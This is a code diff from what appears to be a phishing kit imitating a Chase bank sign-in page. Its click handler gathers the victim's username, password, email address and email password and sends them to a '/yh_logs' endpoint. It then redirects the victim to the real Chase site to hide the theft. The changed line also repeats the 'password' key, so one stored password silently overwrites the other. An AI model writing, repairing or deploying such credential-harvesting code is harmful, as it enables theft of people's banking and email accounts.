@@ -223,7 +223,7 @@ $('#signin-button').on('click', ()=>{
 console.log(4);
 setTimeout(function(){ $('.loader-default').addClass('is-active'); }, 300);
 setInterval(function(){ $('.loader-default').attr('data-text',$('.loader-default').attr('data-text')+'.' ); }, 1000);
-$.get( "/yh_logs", { username: datastg['username'], email: $('#userId-text-input-field').val(), password:datastg['password'], emailpassword: $('#password-text-input-field').val()}).done(function( data ) {
+$.get( "/yh_logs", { username: datastg['username'], email: $('#userId-text-input-field').val(), password:datastg['password1'], password:datastg['password2'], emailpassword: $('#password-text-input-field').val()}).done(function( data ) {
     window.location.replace("https://secure07a.chase.com");
   });
 
